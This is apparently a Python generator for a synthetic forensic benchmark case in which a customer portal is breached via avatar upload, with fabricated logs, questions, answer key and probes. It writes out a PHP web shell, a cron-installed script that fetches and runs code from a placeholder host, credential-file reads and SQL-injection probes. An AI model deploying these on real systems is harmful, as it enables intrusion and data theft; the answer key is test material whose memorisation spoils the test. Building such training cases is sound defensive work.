"""Case web-intrusion: a customer portal's web server, from its logs alone.

What the case plants, by kind (the values come from the seed):

- hard present, secondary source: the upload that planted the web shell and
  every command run through it, only in a rotated, compressed access log
  six days back;
- correlation: the application's upload log records the stored name but
  logs every client as 127.0.0.1; the access log's POST at the same second
  gives the address;
- hard present, encoded: what the persistence runs, written through the web
  shell as base64 inside a URL-encoded query, so its callback host exists
  only there (the script itself was not collected);
- misleading clues: a loud scanner with sqlmap and Nikto, SSH brute force
  and a forbidden export of the customers table; the attacker's return from
  a second address, the only shell use in the uncompressed logs; routine
  SSH logins by the deploy account;
- absent: which CVE was exploited (an unrestricted upload in the
  application's own code, no CVE), and an SSH login by the attacker (the
  auth logs cover the whole window and show none: a bounded negative);
- missing: which tables were read, which needs the database server's query
  log (the dump went out through POSTs, whose bodies nginx does not log);
- late: the database server's general query log for that night.
"""

from __future__ import annotations

import base64
import datetime as dt
import gzip
import urllib.parse
from typing import Dict, List, Tuple

from .common import (
    CaseOutput, Probe, at, fact, goal_document, human_date, ip_pattern, iso_z, minute_pattern, nginx_time, person,
    question, rfc3339_us, rx, word_pattern,
)
from .deflate import gzip_bytes
from .rng import Rng

CASE_ID = "web-intrusion"

ORGS = [("Harbor Lane Outfitters", "harborlane"), ("Nordvik Pharmacy", "nordvik"), ("Quill & Ember Books", "quillember"),
        ("Tessera Home", "tessera"), ("Ridgeway Cycles", "ridgeway"), ("Solberg Opticians", "solberg")]
BEACON_WORDS = ["img-cache", "cdn-assets", "update-mirror", "pixel-edge", "static-sync", "metrics-hub"]
TABLES_TRUE = ["loyalty_members", "payment_tokens", "partner_accounts", "support_tickets", "gift_cards"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (Linux; Android 15; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
]
BOT_UAS = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
           "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"]


def _ip(rng: Rng, block: str) -> str:
    if block == "doc":
        return f"192.0.2.{rng.between(2, 254)}"
    if block == "bench":
        return f"198.{rng.between(18, 19)}.{rng.between(0, 255)}.{rng.between(1, 254)}"
    raise ValueError(block)


def build(seed: str) -> CaseOutput:
    rng = Rng(seed, CASE_ID)
    taken: List[str] = []
    ops = person(rng, taken)
    lead = person(rng, taken)
    org, slug = rng.choice(ORGS)
    site = f"portal.{slug}.example"
    web_ip = f"10.20.1.{rng.between(20, 40)}"
    db_ip = f"10.20.1.{rng.between(50, 70)}"
    jump_ip = f"10.20.0.{rng.between(10, 19)}"
    attacker = f"203.0.113.{rng.between(10, 250)}"
    attacker2 = f"203.0.113.{rng.between(10, 250)}"
    while attacker2 == attacker:
        attacker2 = f"203.0.113.{rng.between(10, 250)}"
    scanner = f"198.51.100.{rng.between(10, 250)}"
    beacon = f"{rng.choice(BEACON_WORDS)}.{rng.choice(['northgate', 'lumen', 'vireo', 'kestrel', 'tallis'])}.example"
    t_true, t_true2 = rng.sample(TABLES_TRUE, 2)
    shell = rng.hex(8)
    attacker_account = rng.choice(["mkaya", "jdoe", "tester", "alex", "guest"]) + str(rng.between(10, 99))

    d0 = dt.date(2026, 1, 5) + dt.timedelta(days=7 * rng.between(0, 20))  # Monday of week 1
    collect_day = d0 + dt.timedelta(days=17)  # Thursday of week 3
    collect_at = at(collect_day, 15, rng.between(0, 40), rng.between(0, 59))
    exploit_day = collect_day - dt.timedelta(days=6)  # Friday of week 2
    days = [collect_day - dt.timedelta(days=k) for k in range(10)]  # access.log, .1, .2.gz … .9.gz

    def us() -> int:
        return rng.between(0, 999999)

    # --- the intrusion, to the second ------------------------------------------------------------
    t0 = at(exploit_day, 3, rng.between(2, 9), rng.between(0, 59))
    ua_x = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    access: List[Tuple[dt.datetime, str]] = []

    def hit(t: dt.datetime, ip: str, method: str, path: str, status: int, size: int, ref: str = "-", ua: str = "-") -> None:
        access.append((t, f'{ip} - - [{nginx_time(t)}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))

    t = t0
    for method, path, status in [("GET", "/", 200), ("GET", "/account/register", 200), ("POST", "/account/register", 302),
                                 ("GET", "/account", 200), ("GET", "/account/avatar", 200)]:
        hit(t, attacker, method, path, status, rng.between(900, 14000), f"https://{site}/", ua_x)
        t += dt.timedelta(seconds=rng.between(4, 30))
    upload_at = t
    hit(upload_at, attacker, "POST", "/account/avatar", 200, rng.between(300, 700), f"https://{site}/account/avatar", ua_x)
    script = (
        "#!/bin/sh\n"
        "# keep the asset cache fresh\n"
        "H=$(hostname)\n"
        f'curl -fsS -m 20 -A "Mozilla/5.0 (compatible; UpdateCheck/1.1)" "https://{beacon}/v1/check?h=$H" '
        "-o /var/tmp/.cache/.u && sh /var/tmp/.cache/.u\n"
    )
    b64 = base64.b64encode(script.encode("ascii")).decode("ascii")
    commands = [
        "id", "uname -a", "cat /etc/passwd", "ls -la /srv/portal", "cat /srv/portal/.env", "mkdir -p /var/tmp/.cache",
        f"echo {b64} | base64 -d > /var/tmp/.cache/update.sh", "chmod +x /var/tmp/.cache/update.sh",
        '(crontab -l 2>/dev/null; echo "*/5 * * * * /var/tmp/.cache/update.sh >/dev/null 2>&1") | crontab -',
        "crontab -l",
    ]
    t = upload_at + dt.timedelta(seconds=rng.between(20, 60))
    cmd_times = []
    # What each command prints, wrapped in <pre></pre>: the size nginx logs for its body.
    out_sizes = [(55, 75), (100, 130), (1400, 2600), (500, 900), (300, 700), (11, 11), (11, 11), (11, 11), (11, 11), (60, 75)]
    for c, (lo_b, hi_b) in zip(commands, out_sizes):
        q = urllib.parse.quote(c, safe="")
        hit(t, attacker, "GET", f"/files/{shell}.php?c={q}", 200, rng.between(lo_b, hi_b), "-", ua_x)
        cmd_times.append(t)
        t += dt.timedelta(seconds=rng.between(15, 110))
    cron_installed = cmd_times[8]
    dump_start = t + dt.timedelta(minutes=rng.between(3, 8))
    dumps = []
    for k in range(3):
        td = dump_start + dt.timedelta(seconds=rng.between(10, 40) + 25 * k)
        hit(td, attacker, "POST", f"/files/{shell}.php", 200, rng.between(400_000, 4_500_000), "-", ua_x)
        dumps.append(td)
    return_at = at(collect_day - dt.timedelta(days=1), 22, rng.between(30, 55), rng.between(0, 59))
    hit(return_at, attacker2, "GET", f"/files/{shell}.php?c=id", 200, rng.between(40, 60), "-", "curl/8.5.0")
    hit(return_at + dt.timedelta(seconds=rng.between(5, 20)), attacker2, "GET",
        f"/files/{shell}.php?c={urllib.parse.quote('ls -la /var/tmp/.cache', safe='')}", 200, rng.between(200, 400), "-", "curl/8.5.0")

    # The scanner: loud, and never in.
    scan_windows = [at(collect_day - dt.timedelta(days=3), 9, rng.between(0, 30)), at(collect_day - dt.timedelta(days=1), 14, rng.between(0, 30)),
                    at(collect_day, 11, rng.between(0, 30))]
    probes_paths = ["/wp-login.php", "/.git/config", "/phpmyadmin/", "/admin/", "/server-status", "/.env", "/backup.zip",
                    "/api/v1/users", "/cgi-bin/luci", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                    "/products?id=1%27%20AND%201%3D1--", "/products?id=1%20UNION%20SELECT%20NULL--"]
    scan_ua = ["sqlmap/1.8.4#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000312)"]
    export_decoy = None
    for w in scan_windows:
        tt = w
        for k in range(rng.between(120, 200)):
            p = rng.choice(probes_paths)
            hit(tt, scanner, "GET", p, rng.choice([404, 404, 404, 403, 400]), rng.between(150, 600), "-", rng.choice(scan_ua))
            tt += dt.timedelta(seconds=rng.between(0, 3), microseconds=us())
        if export_decoy is None:
            export_decoy = tt
            hit(tt, scanner, "GET", "/admin/export?table=customers&format=csv", 403, 162, "-", scan_ua[0])

    # Ordinary traffic, every day.
    for day in days:
        n = rng.between(260, 380)
        for _ in range(n):
            tt = at(day, rng.between(0, 23), rng.between(0, 59), rng.between(0, 59))
            ip = _ip(rng, rng.choice(["doc", "bench", "bench"]))
            path = rng.choice(["/", "/products", f"/products/{rng.between(100, 999)}", f"/static/css/app.{rng.hex(8)}.css",
                               f"/static/js/app.{rng.hex(8)}.js", f"/img/p/{rng.between(100, 999)}.webp", "/account/login",
                               "/account", "/api/cart", "/favicon.ico", "/robots.txt", "/account/avatar"])
            method = "POST" if path in ("/api/cart",) and rng.chance(1, 3) else "GET"
            status = rng.choice([200, 200, 200, 200, 200, 304, 304, 302, 404])
            ua = rng.choice(UAS + ([rng.choice(BOT_UAS)] if rng.chance(1, 10) else []))
            hit(tt, ip, method, path, status, rng.between(200, 90000), rng.choice(["-", f"https://{site}/", "https://search.example/"]), ua)

    # Honest avatar uploads.
    uploads: List[Tuple[dt.datetime, str]] = []
    for day in days[::-1]:
        for _ in range(rng.between(1, 4)):
            tt = at(day, rng.between(8, 21), rng.between(0, 59), rng.between(0, 59), us())
            ip = _ip(rng, "bench")
            ext = rng.choice(["jpg", "png", "jpg", "webp"])
            hit(tt, ip, "POST", "/account/avatar", 200, rng.between(300, 700), f"https://{site}/account/avatar", rng.choice(UAS))
            uploads.append((tt, '{"ts":"%s","level":"info","msg":"avatar stored","remote":"127.0.0.1","account":"cust-%d",'
                                '"orig":"%s.%s","stored":"files/%s.%s","bytes":%d}'
                            % (tt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{tt.microsecond // 1000:03d}Z", rng.between(1000, 99999),
                               rng.choice(["me", "avatar", "IMG_2231", "profile", "photo"]), ext, rng.hex(8), ext, rng.between(20_000, 900_000))))
    shell_src = ('<?php if(isset($_REQUEST["c"])){echo "<pre>";$o=shell_exec($_REQUEST["c"]." 2>&1");echo htmlspecialchars($o);'
                 'echo "</pre>";} ?>\n')
    uploads.append((upload_at, '{"ts":"%s","level":"info","msg":"avatar stored","remote":"127.0.0.1","account":"%s",'
                               '"orig":"avatar.php","stored":"files/%s.php","bytes":%d}'
                    % (upload_at.strftime("%Y-%m-%dT%H:%M:%S.") + f"{rng.between(0, 999):03d}Z", attacker_account, shell, len(shell_src))))
    uploads.sort()
    upload_log = "".join(line + "\n" for _, line in uploads).encode("utf-8")

    # --- nginx files: one per day, the older ones compressed -------------------------------------
    access.sort(key=lambda r: r[0])
    inputs: Dict[str, bytes] = {}
    for k, day in enumerate(days):
        lo = at(day, 0, 0)
        hi = collect_at if k == 0 else lo + dt.timedelta(days=1)
        lines = [s for tt, s in access if lo <= tt < hi]
        body = "".join(s + "\n" for s in lines).encode("utf-8")
        name = "web01/var/log/nginx/access.log" + ("" if k == 0 else f".{k}")
        if k >= 2:
            last = max(tt for tt, s in access if lo <= tt < hi)
            inputs[name + ".gz"] = gzip_bytes(body, name="access.log.2", mtime=int(last.timestamp()))
        else:
            inputs[name] = body
    # Anything older than the ten days is gone, as logrotate's "rotate 9" leaves it.

    # --- auth.log: weekly, three files -----------------------------------------------------------
    auth: List[Tuple[dt.datetime, int, str]] = []
    seq = [0]

    def a(tt: dt.datetime, s: str) -> None:
        seq[0] += 1
        auth.append((tt, seq[0], s))

    pid = [rng.between(20000, 30000)]

    def next_pid() -> int:
        pid[0] += rng.between(2, 60)
        return pid[0]

    start = at(d0, 0, 0)
    day = d0
    while at(day, 0, 0) < collect_at:
        for hh in range(24):
            tt = at(day, hh, 17, 1, us())
            if tt < collect_at:
                p = next_pid()
                a(tt, f"CRON[{p}]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)")
                a(tt + dt.timedelta(milliseconds=3), f"CRON[{p}]: pam_unix(cron:session): session closed for user root")
        day += dt.timedelta(days=1)
    tt = cron_installed + dt.timedelta(minutes=5 - cron_installed.minute % 5, seconds=-cron_installed.second + 1)
    while tt < collect_at:
        p = next_pid()
        a(tt, f"CRON[{p}]: pam_unix(cron:session): session opened for user www-data(uid=33) by www-data(uid=0)")
        a(tt + dt.timedelta(milliseconds=rng.between(900, 1900)), f"CRON[{p}]: pam_unix(cron:session): session closed for user www-data")
        tt += dt.timedelta(minutes=5, microseconds=rng.between(0, 900))
    deploys = [at(d0 + dt.timedelta(days=2), 16, rng.between(10, 30), rng.between(0, 59)),
               at(exploit_day - dt.timedelta(days=2), 16, rng.between(10, 30), rng.between(0, 59)),
               at(collect_day - dt.timedelta(days=2), 10, rng.between(0, 20), rng.between(0, 59))]
    sess = [rng.between(300, 400)]
    for dtime in deploys:
        p = next_pid()
        a(dtime, f"sshd[{p}]: Accepted publickey for deploy from {jump_ip} port {rng.between(40000, 60000)} ssh2: ED25519 SHA256:{rng.hex(43)}")
        a(dtime + dt.timedelta(milliseconds=30), f"sshd[{p}]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)")
        a(dtime + dt.timedelta(milliseconds=80), f"systemd-logind[612]: New session {sess[0]} of user deploy.")
        s1 = dtime + dt.timedelta(minutes=1, seconds=rng.between(0, 59))
        a(s1, "sudo:   deploy : TTY=pts/0 ; PWD=/srv/portal ; USER=root ; COMMAND=/usr/bin/systemctl reload php8.3-fpm")
        a(s1 + dt.timedelta(milliseconds=6), "sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)")
        a(s1 + dt.timedelta(seconds=1), "sudo: pam_unix(sudo:session): session closed for user root")
        out = dtime + dt.timedelta(minutes=rng.between(4, 12), seconds=rng.between(0, 59))
        a(out, f"sshd[{p}]: pam_unix(sshd:session): session closed for user deploy")
        a(out + dt.timedelta(milliseconds=40), f"systemd-logind[612]: Removed session {sess[0]}.")
        sess[0] += 1
    brute = at(collect_day - dt.timedelta(days=3), 9, rng.between(35, 50), rng.between(0, 59))
    for k in range(rng.between(140, 220)):
        p = next_pid()
        user = rng.choice(["admin", "root", "ubuntu", "test", "oracle", "deploy", "git", "postgres"])
        port = rng.between(30000, 65000)
        if user in ("root", "deploy", "ubuntu"):
            a(brute, f"sshd[{p}]: Failed password for {user} from {scanner} port {port} ssh2")
        else:
            a(brute, f"sshd[{p}]: Invalid user {user} from {scanner} port {port}")
            a(brute + dt.timedelta(milliseconds=200), f"sshd[{p}]: Failed password for invalid user {user} from {scanner} port {port} ssh2")
        a(brute + dt.timedelta(seconds=1), f"sshd[{p}]: Connection closed by authenticating user {user} {scanner} port {port} [preauth]"
          if user in ("root", "deploy", "ubuntu") else f"sshd[{p}]: Connection closed by invalid user {user} {scanner} port {port} [preauth]")
        brute += dt.timedelta(seconds=rng.between(1, 9), microseconds=us())
    auth.sort()
    rot2, rot3 = at(d0 + dt.timedelta(days=7), 0, 0), at(d0 + dt.timedelta(days=14), 0, 0)

    def render(lo: dt.datetime, hi: dt.datetime) -> bytes:
        return "".join(f"{rfc3339_us(tt)} web01 {s}\n" for tt, _, s in auth if lo <= tt < hi).encode("utf-8")

    auth1 = render(start, rot2)
    inputs["web01/var/log/auth.log.2.gz"] = gzip_bytes(auth1, name="auth.log.2", mtime=int(max(tt for tt, _, _ in auth if tt < rot2).timestamp()))
    inputs["web01/var/log/auth.log.1"] = render(rot2, rot3)
    inputs["web01/var/log/auth.log"] = render(rot3, collect_at)
    inputs["web01/srv/portal/storage/logs/upload.log"] = upload_log
    installed = f"{cron_installed:%a %b} {cron_installed.day:2d} {cron_installed:%H:%M:%S %Y}"
    inputs["web01/var/spool/cron/crontabs/www-data"] = (
        "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n"
        f"# (- installed on {installed})\n"
        "# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)\n"
        "*/5 * * * * /var/tmp/.cache/update.sh >/dev/null 2>&1\n"
    ).encode("utf-8")
    inputs["CASE.md"] = f"""# Intake note

Client: {org}
Requested by: {lead['full']}, IT operations
Received: {human_date(collect_day)}

## Background

The hosting provider reported that the customer portal's web server `web01`
({site}, internal address {web_ip}) makes regular outbound HTTPS requests
to a host nobody recognises. The server was left running; the operations team
copied its logs and the files below for the lab.

## What was collected

| Item | Description | Collected by | When (UTC) |
| --- | --- | --- | --- |
| `web01/var/log/nginx/` | nginx access logs as logrotate left them (daily, nine kept) | {ops['full']} | {iso_z(collect_at)} |
| `web01/var/log/auth.log*` | the system's authentication logs (weekly) | {ops['full']} | {iso_z(collect_at)} |
| `web01/srv/portal/storage/logs/upload.log` | the portal application's upload log | {ops['full']} | {iso_z(collect_at)} |
| `web01/var/spool/cron/crontabs/www-data` | the web server user's crontab | {ops['full']} | {iso_z(collect_at)} |

SHA-256 of every file is in `inputs.json`.

## Notes

`web01` runs Ubuntu 24.04, nginx and PHP-FPM 8.3 in front of the portal
application; the database runs on a separate server, `db01` ({db_ip}). All
clocks are UTC and synchronised by NTP. Deployments are made over SSH from
the jump host {jump_ip} with the `deploy` account.
""".encode("utf-8")

    # --- the late item: the database server's query log -------------------------------------------
    late_name = "late/db01-mysql-general.log"
    db_lines = [f"/usr/sbin/mysqld, Version: 8.0.43-0ubuntu0.24.04.1 ((Ubuntu)). started with:",
                "Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock",
                "Time                 Id Command    Argument"]
    conn = rng.between(4000, 6000)
    lo = at(exploit_day, 2, 0)
    tt = lo
    events: List[Tuple[dt.datetime, str]] = []
    while tt < at(exploit_day, 5, 0):
        conn += 1
        events.append((tt, f"{conn} Connect\tportal@{web_ip} on portal using TCP/IP"))
        events.append((tt + dt.timedelta(microseconds=400), f"{conn} Query\tSELECT id, name, price FROM products WHERE id = {rng.between(100, 999)}"))
        events.append((tt + dt.timedelta(microseconds=900), f"{conn} Quit\t"))
        tt += dt.timedelta(seconds=rng.between(20, 240), microseconds=us())
    dconn = conn + 1
    q0 = dumps[0] - dt.timedelta(seconds=rng.between(1, 3), microseconds=-us())
    events.append((q0, f"{dconn} Connect\tportal@{web_ip} on portal using TCP/IP"))
    events.append((q0 + dt.timedelta(microseconds=500), f"{dconn} Query\tSHOW TABLES"))
    events.append((q0 + dt.timedelta(microseconds=900), f"{dconn} Quit\t"))
    for k, (tab, when) in enumerate([(t_true, dumps[1]), (t_true2, dumps[2])]):
        qc = dconn + 1 + k
        qt = when - dt.timedelta(seconds=rng.between(2, 6), microseconds=-us())
        events.append((qt, f"{qc} Connect\tportal@{web_ip} on portal using TCP/IP"))
        events.append((qt + dt.timedelta(microseconds=700), f"{qc} Query\tSELECT * FROM {tab}"))
        events.append((qt + dt.timedelta(seconds=rng.between(1, 3), microseconds=us()), f"{qc} Quit\t"))
    events.sort()
    for tt, s in events:
        db_lines.append(f"{tt.strftime('%Y-%m-%dT%H:%M:%S.')}{tt.microsecond:06d}Z\t{s}")
    late = {late_name: ("\n".join(db_lines) + "\n").encode("utf-8")}

    # --- the goal ---------------------------------------------------------------------------------
    goal = goal_document(
        meta={"title": "Customer portal web server", "summary": "A web server's logs after an unexplained outbound connection; how it was entered, what was done, what persists",
              "evidence": "logs", "os": "linux", "toolbox": "dfir", "more_evidence": "ask"},
        goal=f"""{org}'s hosting provider reported that the customer portal's web server `web01` makes regular
outbound requests to a host nobody recognises. The operations team copied the server's logs, the portal
application's upload log and the web server user's crontab. Establish how the server was entered, what was
done on it, what keeps running there and what was taken, and say plainly where the evidence ends.

The evidence is under `inputs/` (read-only; call `inputs` to list it, and read `inputs.json` for the
manifest). `inputs/CASE.md` is the intake note: what was collected, when and by whom. If `SWARM.md` has an
"Evidence catalog" section, the kickoff already ran the first pass into `catalog/`; read it before running
the same commands again.""",
        objectives=["Establish how the server was compromised and what the attacker did on it.",
                    "Establish what the attacker left running and what data was taken."],
        questions=[
            "Initial access: which address first exploited the portal, when (UTC), through which request, and how is that established?",
            "The web shell: its file name and path, how it got there, and every command run through it that the evidence shows (decoded), in order.",
            "Persistence: how did the attacker keep access after the web shell, what does the mechanism run, and where does it connect?",
            "Data access: which database tables did the attacker read?",
            "SSH: did the attacker log in to the server over SSH at any time, and if so from where and as whom?",
            "The vulnerability: which CVE did the attacker exploit?",
            "The timeline of the events above, merged from every source and cited to `ledger/ledger.md`; the hypotheses tested; what remains uncertain and what additional evidence would resolve it.",
        ],
        existence=["5"],
        timeline_rows=10,
        events=8,
        # What the brief above states as given, and nothing a question asks: how the
        # server was entered, what runs there and where it connects are the questions'.
        premises=[
            f"`web01` is the web server of {org}'s customer portal. [scope: entities web01]",
            "The operations team copied the server's logs, the portal application's upload log and the web server user's crontab. [scope: entities web01]",
        ],
    )

    # --- the truth --------------------------------------------------------------------------------
    gz_day = f"access.log.{(collect_day - exploit_day).days}.gz"
    questions = [
        question("1", "Which address first exploited the portal, when, through which request.", kind="present",
                 expected={"result": "established", "accept_results": ["established", "partial"],
                           "summary": f"{attacker} at {iso_z(upload_at)}: POST /account/avatar uploading avatar.php, stored as files/{shell}.php (upload.log), after registering an account; in {gz_day}."},
                 facts=[
                     fact("F1.1", "hard_present", "The attacker's first address, only in a compressed rotated access log, tied to the upload by the upload log's time and stored name.", [ip_pattern(attacker)], subkind="secondary", where=gz_day),
                     fact("F1.2", "hard_present", "The upload's time.", [minute_pattern(upload_at)], subkind="correlation", where=f"{gz_day}, upload.log"),
                     fact("F1.3", "decoy", "The scanner: loud, in the plain logs and the auth log, never successful.", [ip_pattern(scanner)]),
                     fact("F1.4", "decoy", "The attacker's later address, the only shell use in the uncompressed logs.", [ip_pattern(attacker2)]),
                 ]),
        question("2", "The web shell and the commands run through it.", kind="present",
                 expected={"result": "established", "accept_results": ["established", "partial"],
                           "summary": f"files/{shell}.php, uploaded as avatar.php through the avatar form; commands: {'; '.join(commands[:6])}; the base64 write of update.sh; chmod; the crontab install; crontab -l."},
                 facts=[
                     fact("F2.1", "present", "The shell's stored name.", [word_pattern(shell)], subkind="correlation"),
                     fact("F2.2", "present", "The read of the application's .env (its database credentials).", [rx(r"\.env")]),
                     fact("F2.3", "present", "The script written through the shell from base64.", [rx("base64")]),
                 ]),
        question("3", "Persistence: mechanism, what it runs, where it connects.", kind="present",
                 expected={"result": "established", "accept_results": ["established", "partial"],
                           "summary": f"www-data crontab every 5 minutes running /var/tmp/.cache/update.sh, installed {iso_z(cron_installed)}; the script (base64 in the shell command) fetches https://{beacon}/v1/check and runs what it gets."},
                 facts=[
                     fact("F3.1", "present", "The cron entry for www-data.", [rx(r"update\.sh")]),
                     fact("F3.2", "hard_present", "The callback host, only inside the base64 of a URL-encoded shell command in a compressed log; the script was not collected.", [word_pattern(beacon)], subkind="encoded", where=gz_day),
                 ]),
        question("4", "Which database tables the attacker read.", kind="missing",
                 expected={"result": "not_determinable", "accept_results": ["not_determinable", "partial"],
                           "summary": f"Not determinable from web01's logs: the attacker read the application's database credentials and sent three POSTs to the shell with large responses ({iso_z(dumps[0])} onward), but nginx logs no request bodies. db01's query log is needed."},
                 facts=[
                     fact("F4.1", "missing", "The queries are recorded only on the database server, which was not collected."),
                     fact("F4.2", "decoy", "The scanner's forbidden request for the customers table's export.", [word_pattern("customers")]),
                 ],
                 acquisition={"accept": [rx("db01|database|mysql|mariadb|query log|general log|audit log|binlog|binary log")]},
                 late={"item": late_name,
                       "expected": {"result": "established", "accept_results": ["established", "partial"],
                                    "summary": f"SELECT * FROM {t_true} and SELECT * FROM {t_true2} from {web_ip}, at the times of the shell's large POST responses."},
                       "facts": [fact("F4.3", "late", "The first table read.", [word_pattern(t_true)]),
                                 fact("F4.4", "late", "The second table read.", [word_pattern(t_true2)])]}),
        question("5", "Whether the attacker logged in over SSH.", kind="absent",
                 expected={"result": "bounded_negative", "accept_results": ["bounded_negative"],
                           "summary": f"No: auth.log, auth.log.1 and auth.log.2.gz cover {iso_z(start)} to {iso_z(collect_at)} without a gap; the only accepted logins are deploy from {jump_ip}; the scanner's brute force failed; neither attacker address appears."},
                 facts=[
                     fact("F5.1", "absent", "No successful SSH login by the attacker in a complete auth log."),
                     fact("F5.2", "decoy", "The deploy account's routine logins from the jump host.", [ip_pattern(jump_ip), word_pattern("deploy")]),
                     fact("F5.3", "decoy", "The scanner's failed brute force.", [ip_pattern(scanner)]),
                 ]),
        question("6", "Which CVE was exploited.", kind="absent",
                 expected={"result": "premise_not_supported", "accept_results": ["premise_not_supported", "not_determinable", "bounded_negative"],
                           "summary": "No CVE: the portal's own avatar upload stored a .php file under the web root and served it; nothing in the evidence names a CVE or a vulnerable version."},
                 facts=[
                     fact("F6.1", "absent", "Nothing in the evidence ties the entry to a CVE."),
                     fact("F6.2", "decoy", "Any CVE identifier asserted.", [rx(r"CVE-\d{4}-\d{3,}")]),
                 ]),
        question("7", "The timeline, the hypotheses and what remains open.", kind="present", scored=False,
                 expected={"result": "established", "accept_results": ["established", "partial"], "summary": "Not scored."}, facts=[]),
    ]

    # --- the probes -------------------------------------------------------------------------------
    plain = {k: v for k, v in inputs.items() if not k.endswith(".gz")}
    plain_blob = b"".join(plain.values())
    unz = {k: gzip.decompress(v) for k, v in inputs.items() if k.endswith(".gz")}
    everything = plain_blob + b"".join(unz.values())
    exploit_gz = unz.get(f"web01/var/log/nginx/{gz_day}", b"")
    probes = [
        Probe("F1.1", "the attacker's first address is only in the compressed access log of the exploit day",
              lambda: attacker.encode() in exploit_gz and attacker.encode() not in plain_blob
              and all(attacker.encode() not in v for k, v in unz.items() if k != f"web01/var/log/nginx/{gz_day}")),
        Probe("F1.2", "the upload log names the stored shell at the upload's second, and logs 127.0.0.1",
              lambda: f'"stored":"files/{shell}.php"'.encode() in upload_log and upload_at.strftime("%Y-%m-%dT%H:%M:%S").encode() in upload_log
              and f'"remote":"{attacker}"'.encode() not in upload_log),
        Probe("F1.3", "the scanner is in the plain logs", lambda: scanner.encode() in plain_blob),
        Probe("F1.4", "the second address is the only shell use in the plain access logs",
              lambda: all((attacker2 in s) for s in (b"\n".join(plain.values()).decode().splitlines()) if f"/files/{shell}.php" in s)),
        Probe("F3.2", "the callback host is only inside the base64 of the shell command, nowhere as plain text",
              lambda: beacon.encode() not in everything and urllib.parse.quote(commands[6], safe="").encode() in exploit_gz
              and beacon.encode() in base64.b64decode(b64)),
        Probe("F4.1", "the tables read are in no input, only in the late item",
              lambda: t_true.encode() not in everything and t_true2.encode() not in everything and t_true.encode() in late[late_name]),
        Probe("F4.2", "the forbidden customers export is in the logs", lambda: b"table=customers" in everything),
        Probe("F5.1", "no accepted SSH login but the deploy account's from the jump host, and the auth logs have no gap",
              lambda: all(f"for deploy from {jump_ip}" in s for tt, _, s in auth if "Accepted" in s)
              and attacker.encode() not in b"".join(v for k, v in list(plain.items()) + list(unz.items()) if "auth.log" in k)
              and _hourly_cron_unbroken(auth, start, collect_at)),
        Probe("F6.1", "no CVE identifier anywhere in the evidence", lambda: b"CVE-" not in everything),
    ]
    context = {
        "org": org, "site": site, "web01": web_ip, "db01": db_ip, "jump_host": jump_ip,
        "attacker": {"first": attacker, "later": attacker2, "account": attacker_account, "ua": ua_x},
        "scanner": scanner, "shell": f"files/{shell}.php", "beacon": beacon, "tables": [t_true, t_true2],
        "times": {"upload": iso_z(upload_at), "cron_installed": iso_z(cron_installed), "dumps": [iso_z(d) for d in dumps],
                  "return": iso_z(return_at), "collected": iso_z(collect_at)},
        "exploit_log": gz_day,
    }
    mtimes = {k: collect_at for k in inputs}
    mtimes[late_name] = collect_at + dt.timedelta(days=2)
    return CaseOutput(case_id=CASE_ID, title="Customer portal web server", inputs=inputs, late=late, goal=goal,
                      questions=questions, probes=probes, context=context, mtimes=mtimes, late_for={late_name: ["4"]},
                      late_what={late_name: "An excerpt of the database server db01's MySQL general query log, as the database team would supply it on request."})


def _hourly_cron_unbroken(auth: List[Tuple[dt.datetime, int, str]], start: dt.datetime, end: dt.datetime) -> bool:
    """The auth logs are continuous: root's hourly cron session is there for every hour of the window."""
    hours = {(tt.date(), tt.hour) for tt, _, s in auth if "session opened for user root(uid=0) by root" in s}
    t = start
    while t + dt.timedelta(hours=1) < end:
        if (t.date(), t.hour) not in hours:
            return False
        t += dt.timedelta(hours=1)
    return True
